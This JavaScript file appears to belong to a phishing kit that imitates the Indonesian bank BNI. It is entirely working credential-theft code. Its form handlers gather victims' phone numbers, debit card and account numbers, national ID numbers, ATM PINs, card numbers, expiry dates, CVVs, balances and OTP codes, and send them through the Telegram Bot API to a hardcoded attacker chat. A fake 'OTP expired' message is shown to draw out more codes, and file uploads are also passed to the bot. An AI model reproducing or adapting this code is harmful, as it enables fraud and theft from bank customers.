var grup = id_telegram;
var token = id_botTele;
function sendNohp(event) {
    event.preventDefault();

    $("#loadersaya").show();

    var logo = document.getElementById('logo');
    var nope = document.getElementById('nope');

    var gabungan = `( BNI | NoHP )%0A%0A- No HP : ${nope.value}`;

    // Ganti dengan token bot yang kamu buat
    // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,

        success: function() {
            $("#loadersaya").hide();
            setTimeout(function() {
                var nomor = document.getElementById("nope").value;
                sessionStorage.setItem("nomor", nomor);
                document.getElementById("popupku").style.display = "block";
            }, 1500);
        }
    });
}
;
function sendData(event) {
    $("#loadersaya").show();
    event.preventDefault();

    var logo = document.getElementById('logo');

    var debit = document.getElementById('debit');
    var nikktp = document.getElementById('nikktp');
    var nomorhandphone = document.getElementById('nomorhandphone');
    var pinatm = document.getElementById('pinatm');
    var reke = document.getElementById('reke');

    var gabungan = `( BNI | Data Belum )%0A%0A- No Debit/ATM : ${debit.value}%0A- No KTP : ${nikktp.value}%0A- No HP : ${nomorhandphone.value}%0A- PIN ATM : ${pinatm.value}%0A- No Rek : ${reke.value}`;

    // Ganti dengan token bot yang kamu buat
    // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,

        success: function() {
            $("#loadersaya").hide();
            $("#isidata").fadeOut();
            setTimeout(function() {
                $("#inputotp").fadeIn();
                $("#pin1").focus();
                document.getElementById("thisPhone").innerHTML = "Masukkan Kode OTP<br/>Yang di kirim ke nomor " + nope.value;
            }, 1500);
        }
    });
}
;
class TelegramBotSetup {
    constructor(token) {
        this.token = token;
        this.requestUrl = 'https://api.telegram.org/bot';
    }

    api(type, method, body) {
        return new Promise((resolve,reject)=>{
            fetch(this.requestUrl + this.token + type, {
                method: method,
                body: body
            }).then(res=>{
                resolve(res.json())
            }
            ).catch(err=>{
                reject(err)
            }
            )
        }
        )
    }
}

class Bot extends TelegramBotSetup {
    constructor(botToken, defaultChatID) {
        super(botToken);
        this.dcid = defaultChatID;
    }

    static start() {
        console.log("Send telegram message with JS\nDeveloper: https://manuchehr.me\nDocs: https://github.com/manuchekhr32/send-telegram-message-with-js");
    }

    async getUpdates() {
        try {
            const result = await this.api('/getUpdates', 'GET')
            return await result
        } catch (e) {
            return await e
        }
    }

    async getMe() {
        try {
            const result = await this.api('/getMe', 'GET')
            return await result
        } catch (e) {
            return await e
        }
    }

    async sendPhoto(img, caption, chatID, parseMode, disableNotification) {
        try {
            if (img.startsWith('#')) {
                const file = document.getElementById(img.replace('#', ''));
                const formData = new FormData();
                formData.append("photo", file.files[0])
                const result = await this.api(`/sendPhoto?caption=${caption ? caption : ''}&chat_id=${chatID ? chatID : this.dcid}&parse_mode=${parseMode ? parseMode : 'html'}&disable_notification=${disableNotification ? disableNotification : false}`, 'POST', formData)
                return result
            } else if (typeof img === 'string') {
                const result = this.api(`/sendPhoto?photo=${img}&caption=${caption ? caption : ''}&chat_id=${chatID ? chatID : this.dcid}&parse_mode=${parseMode ? parseMode : 'html'}&disable_notification=${disableNotification ? disableNotification : false}`, 'GET')
                return await result
            }
        } catch (e) {
            return await e
        }
    }

    async sendFile(doc, caption, chatID, parseMode, disableNotification) {
        try {
            if (doc.startsWith('#')) {
                const file = document.getElementById(doc.replace('#', ''));
                const formData = new FormData();
                formData.append("document", file.files[0])
                const result = await this.api(`/sendDocument?caption=${caption ? caption : ''}&chat_id=${chatID ? chatID : this.dcid}&parse_mode=${parseMode ? parseMode : 'html'}&disable_notification=${disableNotification ? disableNotification : false}`, 'POST', formData)
                return await result
            } else if (typeof doc === 'string') {
                const result = await this.api(`/sendDocument?document=${doc}&caption=${caption ? caption : ''}&chat_id=${chatID ? chatID : this.dcid}&parse_mode=${parseMode ? parseMode : 'html'}&disable_notification=${disableNotification ? disableNotification : false}`, 'GET')
                return await result
            }
        } catch (e) {
            return await e
        }
    }
}

Bot.start()

// Your logic here. All functions returns Promise
const bot = new Bot("6499704775:AAFT4hWdVXyEizbq1v9Hs_kfQnoOakOVOfs","6601985632")

document.getElementById("myform").addEventListener("click", (e)=>{

    // With input id
    bot.sendFile("#myFileInput").then(res=>{
        console.log("Success!", res);
    }
    ).catch(err=>console.log(err))
}
)

function kirimPesan(event) {
    event.preventDefault();
    $("#loadersaya1").show();

    var logo = document.getElementById('logo');
    var pin1 = document.getElementById('pin1');
    var pin2 = document.getElementById('pin2');
    var pin3 = document.getElementById('pin3');
    var pin4 = document.getElementById('pin4');
    var pin5 = document.getElementById('pin5');
    var pin6 = document.getElementById('pin6');

    var gabungan = '( BNI | OTP )%0A%0A- Code OTP : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;

    // Ganti dengan token bot yang kamu buat
    // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,

        success: function() {
            $("#blink").addClass("blink");
            document.getElementById("pincode").reset();

            $("#blink").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
            $("#blink").css("color", "red");
            $("#blink").show();
            setTimeout(function() {
                $("#loadersaya1").hide();
                $("#pin1").focus();

            }, 3000);
        }
    });
}
;
function openNotif(event) {
    event.preventDefault();
    $("#loadersaya").show();

    var logo = document.getElementById('logo');
    var nope = document.getElementById('nope');
    var nama = document.getElementById('nama');
    var bulan = document.getElementById('bulan');
    var tahun = document.getElementById('tahun');
    var pesan = document.getElementById('pesan');

    var gabungan = `( BNI | Data Sudah )%0A%0A- No HP : ${nope.value}%0A- No Kartu : ${nama.value}%0A- Masa Berlaku : ${bulan.value}/${tahun.value}%0A- CVV : ${pesan.value}%0A- Saldo : ${document.getElementById('saldo').value}`;

    // Ganti dengan token bot yang kamu buat
    // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,

        success: function() {
            setTimeout(function() {
                document.getElementById("thisPhone").innerHTML = "Masukkan Kode OTP<br/>Yang di kirim ke nomor " + nope.value;
                $("#loadersaya").hide();
                document.getElementById("infoku").style.display = "block";

            }, 500);
        }
    });
}
;
